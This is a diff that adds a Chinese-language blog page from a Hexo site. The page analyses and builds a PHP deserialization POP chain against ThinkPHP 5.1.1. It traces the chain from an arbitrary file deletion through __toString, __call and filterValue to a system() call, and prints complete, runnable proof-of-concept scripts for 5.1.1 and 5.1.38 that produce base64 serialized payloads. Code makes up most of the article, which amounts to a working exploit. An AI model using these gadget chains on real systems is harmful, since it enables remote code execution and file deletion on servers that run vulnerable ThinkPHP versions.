@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Thinkphp 5.1.1 反序列化pop链构造一、漏洞简介5.1.1的代码实现和5.1.38不同，于是就有了这篇文章 二、漏洞影响Thinkphp 5.1.1 三、复现过程这个漏洞的起点是一个任意文件删除漏洞$this-&gt;files内容没有过滤，可以传入任意数值。 &#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;process&#x2F;pipes&#x2F;Windows.php public funct">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.1.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%9E%84%E9%80%A0/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Thinkphp 5.1.1 反序列化pop链构造一、漏洞简介5.1.1的代码实现和5.1.38不同，于是就有了这篇文章 二、漏洞影响Thinkphp 5.1.1 三、复现过程这个漏洞的起点是一个任意文件删除漏洞$this-&gt;files内容没有过滤，可以传入任意数值。 &#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;process&#x2F;pipes&#x2F;Windows.php public funct">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Thinkphp5.1.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%9E%84%E9%80%A0/media/rId26.png">
+<meta property="article:published_time" content="2022-07-08T06:26:05.360Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.403Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Thinkphp5.1.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%9E%84%E9%80%A0/media/rId26.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Thinkphp/Thinkphp 反序列化漏洞/Thinkphp 5.1.1 反序列化pop链构造" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.1.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%9E%84%E9%80%A0/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.360Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Thinkphp-5-1-1-反序列化pop链构造"><a href="#Thinkphp-5-1-1-反序列化pop链构造" class="headerlink" title="Thinkphp 5.1.1 反序列化pop链构造"></a>Thinkphp 5.1.1 反序列化pop链构造</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>5.1.1的代码实现和5.1.38不同，于是就有了这篇文章</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Thinkphp 5.1.1</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>这个漏洞的起点是一个任意文件删除漏洞$this-&gt;files内容没有过滤，可以传入任意数值。</p>
+<pre><code>/thinkphp/library/think/process/pipes/Windows.php
+public function __destruct()
+    &#123;
+        $this-&gt;close();
+        $this-&gt;removeFiles();
+    &#125;
+
+ private function removeFiles()
+    &#123;
+        foreach ($this-&gt;files as $filename) &#123;
+            if (file_exists($filename)) &#123;
+                @unlink($filename);
+            &#125;
+        &#125;
+        $this-&gt;files = [];
+    &#125;
+</code></pre>
+<p>poc</p>
+<pre><code>&lt;?php
+namespace think\process\pipes;
+class Windows
+&#123;
+    private $files = [];
+    public function __construct()
+    &#123;
+        $this-&gt;files = [&#39;1.php&#39;];
+    &#125;
+&#125;
+use think\process\pipes\Windows;
+echo base64_encode(serialize(new Windows()));
+</code></pre>
+<h3 id="反序列链构造"><a href="#反序列链构造" class="headerlink" title="反序列链构造"></a>反序列链构造</h3><blockquote>
+<p>先分析一下thinkphp5.1.38的poc</p>
+</blockquote>
+<pre><code>&lt;?php
+namespace think;
+abstract class Model&#123;
+    protected $append = [];
+    private $data = [];
+    function __construct()&#123;
+        $this-&gt;append = [&quot;ethan&quot;=&gt;[&quot;calc.exe&quot;,&quot;calc&quot;]];
+        $this-&gt;data = [&quot;ethan&quot;=&gt;new Request()];
+    &#125;
+&#125;
+class Request
+&#123;
+    protected $hook = [];
+    protected $filter = &quot;system&quot;;
+    protected $config = [
+        // 表单请求类型伪装变量
+        &#39;var_method&#39;       =&gt; &#39;_method&#39;,
+        // 表单ajax伪装变量
+        &#39;var_ajax&#39;         =&gt; &#39;_ajax&#39;,
+        // 表单pjax伪装变量
+        &#39;var_pjax&#39;         =&gt; &#39;_pjax&#39;,
+        // PATHINFO变量名 用于兼容模式
+        &#39;var_pathinfo&#39;     =&gt; &#39;s&#39;,
+        // 兼容PATH_INFO获取
+        &#39;pathinfo_fetch&#39;   =&gt; [&#39;ORIG_PATH_INFO&#39;, &#39;REDIRECT_PATH_INFO&#39;, &#39;REDIRECT_URL&#39;],
+        // 默认全局过滤方法 用逗号分隔多个
+        &#39;default_filter&#39;   =&gt; &#39;&#39;,
+        // 域名根，如thinkphp.cn
+        &#39;url_domain_root&#39;  =&gt; &#39;&#39;,
+        // HTTPS代理标识
+        &#39;https_agent_name&#39; =&gt; &#39;&#39;,
+        // IP代理获取标识
+        &#39;http_agent_ip&#39;    =&gt; &#39;HTTP_X_REAL_IP&#39;,
+        // URL伪静态后缀
+        &#39;url_html_suffix&#39;  =&gt; &#39;html&#39;,
+    ];
+    function __construct()&#123;
+        $this-&gt;filter = &quot;system&quot;;
+        $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#39;&#39;];
+        $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]];
+    &#125;
+&#125;
+namespace think\process\pipes;
+
+use think\model\concern\Conversion;
+use think\model\Pivot;
+class Windows
+&#123;
+    private $files = [];
+
+    public function __construct()
+    &#123;
+        $this-&gt;files=[new Pivot()];
+    &#125;
+&#125;
+namespace think\model;
+
+use think\Model;
+
+class Pivot extends Model
+&#123;
+&#125;
+use think\process\pipes\Windows;
+echo base64_encode(serialize(new Windows()));
+?&gt;
+</code></pre>
+<p>file_exists如果传入的是对象,将会将对象以字符串的形式处理。而<strong>toString魔术方法是当一个对象被当作字符串对待的时候,会触发这个魔术方法。所以全局搜索带有toString函数的类。<strong><strong>最后找到\thinkphp\library\think\model\concern\Conversion.php的Conversion类</strong></strong>后面的调用流程是</strong><br>toString---&gt;$this-&gt;toJson----&gt;$this-&gt;toArray跟进到toArray方法里，在3.1.38的poc里是通过调用$relation-&gt;visible方法，向$relation传入request对象，而request对象没有visible方法，从而调用**call方法。而我们这里也可以使用这种方法。(注意:**call传入的第一个参数是方法名，第二个参数是参数数组。所以这里传入__call方法的方法名为append，而不是原来的visible)</p>
+<pre><code>$relation = $this-&gt;getAttr($key);
+$item[$key] = $relation-&gt;append($name)-&gt;toArray();
+thinkphp3.1.38代码
+$relation = $this-&gt;getAttr($key);
+if ($relation) &#123; $relation-&gt;visible($name); &#125;
+public function __toString()
+    &#123;
+        return $this-&gt;toJson();
+    &#125;
+
+public function toJson($options = JSON_UNESCAPED_UNICODE)
+    &#123;
+        return json_encode($this-&gt;toArray(), $options);
+    &#125;
+public function toArray()
+    &#123;
+        $item    = [];
+        $visible = [];
+        $hidden  = [];
+
+        ......
+        foreach ($data as $key =&gt; $val) &#123;
+        .........
+
+        // 追加属性（必须定义获取器）
+        if (!empty($this-&gt;append)) &#123;
+            foreach ($this-&gt;append as $key =&gt; $name) &#123;
+                if (is_array($name)) &#123;
+                    // 追加关联对象属性
+                    $relation   = $this-&gt;getAttr($key);
+                    $item[$key] = $relation-&gt;append($name)-&gt;toArray();
+                &#125; elseif (strpos($name, &#39;.&#39;)) &#123;
+                    list($key, $attr) = explode(&#39;.&#39;, $name);
+                    // 追加关联对象属性
+                    $relation   = $this-&gt;getAttr($key);
+                    $item[$key] = $relation-&gt;append([$attr])-&gt;toArray();
+                &#125; else &#123;
+                    $value = $this-&gt;getAttr($name, $item);
+                    if (false !== $value) &#123;
+                        $item[$name] = $value;
+                    &#125;
+                &#125;
+            &#125;
+        &#125;
+
+        return $item;
+    &#125;
+</code></pre>
+<p>由于Conversion和Attribute是trait类型，不能直接调用，所以要找到调用这两个类的类即model类。</p>
+<pre><code>abstract class Model implements \JsonSerializable, \ArrayAccess
+&#123;
+    use model\concern\Attribute;
+    use model\concern\RelationShip;
+    use model\concern\ModelEvent;
+    use model\concern\TimeStamp;
+    use model\concern\Conversion;
+</code></pre>
+<p>model类是抽象类，不能直接调用。所以调用他的子类Pivot类(think\Model\Pivot)。</p>
+<p>在源码中查找存在**call函数和没有append方法的类，(**call方法是在类没有调用函数的时候调用,第一个参数为方法名，第二个参数为方法的第一个参数)最后查找到的是/thinkphp/library/think/Request.php的Request类,其中存在call_user_func_array方法</p>
+<pre><code> public function __call($method, $args)
+    &#123;
+        if (array_key_exists($method, $this-&gt;hook)) &#123;
+            array_unshift($args, $this);
+            return call_user_func_array($this-&gt;hook[$method], $args);
+        &#125; else &#123;
+            throw new Exception(&#39;method not exists:&#39; . static::class . &#39;-&gt;&#39; . $method);
+        &#125;
+    &#125;
+</code></pre>
+<p>虽然$this-&gt;hook可控,但是由于array_unshift函数的作用，导致$args数组中会加入新的数组，所以判断不好利用。但是他是一个回调函数，可以以$this-&gt;hook[$method]=[$this,methodName]这种形式回调函数。在Request类中查找call_user_func_array这种类型的函数，最后找到filterValue函数。filterValue函数里面的call_user_func_array方法是这个漏洞的触发点。回溯$filter和$value</p>
+<pre><code> private function filterValue(&amp;$value, $key, $filters)
+    &#123;
+        $default = array_pop($filters);
+
+        foreach ($filters as $filter) &#123;
+            if (is_callable($filter)) &#123;
+                // 调用函数或者方法过滤
+                $value = call_user_func($filter, $value);
+            &#125; elseif (is_scalar($value)) &#123;
+                if (false !== strpos($filter, &#39;/&#39;)) &#123;
+                    // 正则过滤
+                    if (!preg_match($filter, $value)) &#123;
+                        // 匹配不成功返回默认值
+                        $value = $default;
+                        break;
+                    &#125;
+                &#125; elseif (!empty($filter)) &#123;
+                    // filter函数不存在时, 则使用filter_var进行过滤
+                    // filter为非整形值时, 调用filter_id取得过滤id
+                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));
+                    if (false === $value) &#123;
+                        $value = $default;
+                        break;
+                    &#125;
+                &#125;
+            &#125;
+        &#125;
+
+        return $value;
+    &#125;
+</code></pre>
+<p>最后找到这样的一个调用流程，可以控制$filter, $value这两个变量。isAjax()----&gt;$this-&gt;param()-----&gt;$this-&gt;input-------&gt;$this-&gt;filterValue<br>分析下$filter, $value这两个变量的传递过程:$value:isAjax方法的$this-&gt;config-&gt;get(&#39;var_ajax&#39;)----&gt;param方法的$name-----&gt;input方法的$name。所以$value可控。</p>
+<p>$filter参数:param方法$this-&gt;param----&gt;input方法$data</p>
+<pre><code> public function isAjax($ajax = false)
+    &#123;
+        $value  = $this-&gt;server(&#39;HTTP_X_REQUESTED_WITH&#39;, &#39;&#39;, &#39;strtolower&#39;);
+        $result = (&#39;xmlhttprequest&#39; == $value) ? true : false;
+
+        if (true === $ajax) &#123;
+            return $result;
+        &#125; else &#123;
+            return $this-&gt;param($this-&gt;config-&gt;get(&#39;var_ajax&#39;)) ? true : $result;
+        &#125;
+    &#125;
+
+ public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
+    &#123;
+        if (empty($this-&gt;param)) &#123;
+            .......
+
+        return $this-&gt;input($this-&gt;param, $name, $default, $filter);
+    &#125;
+
+ public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
+    &#123;
+        if (false === $name) &#123;
+            // 获取原始数据
+            return $data;
+        &#125;
+
+        $name = (string) $name;
+        if (&#39;&#39; != $name) &#123;
+            // 解析name
+            if (strpos($name, &#39;/&#39;)) &#123;
+                list($name, $type) = explode(&#39;/&#39;, $name);
+            &#125; else &#123;
+                $type = &#39;s&#39;;
+            &#125;
+            // 按.拆分成多维数组进行判断
+            foreach (explode(&#39;.&#39;, $name) as $val) &#123;
+                if (isset($data[$val])) &#123;
+                    $data = $data[$val];
+                &#125; else &#123;
+                    // 无输入数据，返回默认值
+                    return $default;
+                &#125;
+            &#125;
+            if (is_object($data)) &#123;
+                return $data;
+            &#125;
+        &#125;
+
+        // 解析过滤器
+        $filter = $this-&gt;getFilter($filter, $default);
+
+        if (is_array($data)) &#123;
+            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);
+            reset($data);
+        &#125; else &#123;
+            $this-&gt;filterValue($data, $name, $filter);
+        &#125;
+
+        .......
+        return $data;
+    &#125;
+</code></pre>
+<p>$this-&gt;param=array_merge($this-&gt;param, $this-&gt;get(false), $vars,<br>$this-&gt;route(false));是直接从url中获取参数。$this-&gt;config-&gt;get(&#39;var_ajax&#39;)也是可控的。但是他和5.1.38不同的是，5.1.38的方法是$this-&gt;config[&#39;var_ajax&#39;],所以导致不能用数组直接操控config值。我的解决办法是从源码中查找含有get函数的类,通过pop链的方式操控config的值。<br>最后发现\think\Hook.php的Hook类存在get方法</p>
+<pre><code>public function get($tag = &#39;&#39;)
+    &#123;
+        if (empty($tag)) &#123;
+            //获取全部的插件信息
+            return $this-&gt;tags;
+        &#125; else &#123;
+            return array_key_exists($tag, $this-&gt;tags) ? $this-&gt;tags[$tag] : [];
+        &#125;
+    &#125;
+</code></pre>
+<p>由上面代码可以看出，程序会判断传入的$tag是否为空，不为空的话会返回传入参数在tags数组中对应的值。private<br>$tags =<br>[&quot;var_ajax&quot;=&gt;&#39;a&#39;];类似于这种形式，便可以操控$this-&gt;config-&gt;get(&#39;var_ajax&#39;)的值。由此$filter和$value都是可控的。所以可以通过filterValue方法中的call_user_func_array任意代码执行。</p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>&lt;?php
+namespace think;
+abstract class Model
+&#123;
+    protected $append = [];
+    private $data = [];
+    function __construct()&#123;
+        $this-&gt;append = [&quot;a&quot;=&gt;[&quot;calc.exe&quot;]];
+        $this-&gt;data = [&quot;a&quot;=&gt;new Request()];
+    &#125;
+&#125;
+namespace think\model;
+use think\Model;
+class Pivot extends Model
+&#123;
+&#125;
+namespace think\process\pipes;
+use think\model\Pivot;
+class Windows
+&#123;
+    private $files = [];
+    public function __construct()
+    &#123;
+        $this-&gt;files = [new Pivot()];
+    &#125;
+&#125;
+namespace think;
+class Request
+&#123;
+    protected $hook = [];
+    protected $filter = &quot;system&quot;;
+    protected $config = [
+        // 表单请求类型伪装变量
+        &#39;var_method&#39;       =&gt; &#39;_method&#39;,
+        // 表单ajax伪装变量
+        &#39;var_ajax&#39;         =&gt; &#39;_ajax&#39;,
+        // 表单pjax伪装变量
+        &#39;var_pjax&#39;         =&gt; &#39;_pjax&#39;,
+        // PATHINFO变量名 用于兼容模式
+        &#39;var_pathinfo&#39;     =&gt; &#39;s&#39;,
+        // 兼容PATH_INFO获取
+        &#39;pathinfo_fetch&#39;   =&gt; [&#39;ORIG_PATH_INFO&#39;, &#39;REDIRECT_PATH_INFO&#39;, &#39;REDIRECT_URL&#39;],
+        // 默认全局过滤方法 用逗号分隔多个
+        &#39;default_filter&#39;   =&gt; &#39;&#39;,
+        // 域名根，如thinkphp.cn
+        &#39;url_domain_root&#39;  =&gt; &#39;&#39;,
+        // HTTPS代理标识
+        &#39;https_agent_name&#39; =&gt; &#39;&#39;,
+        // IP代理获取标识
+        &#39;http_agent_ip&#39;    =&gt; &#39;HTTP_X_REAL_IP&#39;,
+        // URL伪静态后缀
+        &#39;url_html_suffix&#39;  =&gt; &#39;html&#39;,
+    ];
+    function __construct()&#123;
+        $this-&gt;filter = &quot;system&quot;;
+        $this-&gt;config = new Hook();
+        $this-&gt;hook = [&quot;append&quot;=&gt;[$this,&quot;isAjax&quot;]];
+    &#125;
+
+&#125;
+namespace think;
+class Hook&#123;
+    private $tags = [&quot;var_ajax&quot;=&gt;&#39;a&#39;];
+    public function get($tag = &#39;&#39;)
+    &#123;
+        if (empty($tag)) &#123;
+            //获取全部的插件信息
+            return $this-&gt;tags;
+        &#125; else &#123;
+            return array_key_exists($tag, $this-&gt;tags) ? $this-&gt;tags[$tag] : [];
+        &#125;
+    &#125;
+&#125;
+use think\process\pipes\Windows;
+echo base64_encode(serialize(new Windows()));
+</code></pre>
+<blockquote>
+<p>漏洞的利用前提是存在一个点可以输入点可以反序列化。</p>
+</blockquote>
+<p><img src="/resource/Thinkphp5.1.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%9E%84%E9%80%A0/media/rId26.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.1.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%9E%84%E9%80%A0/" data-id="cl5c2qwwl00izy8v11n73a1go" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.1.37%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
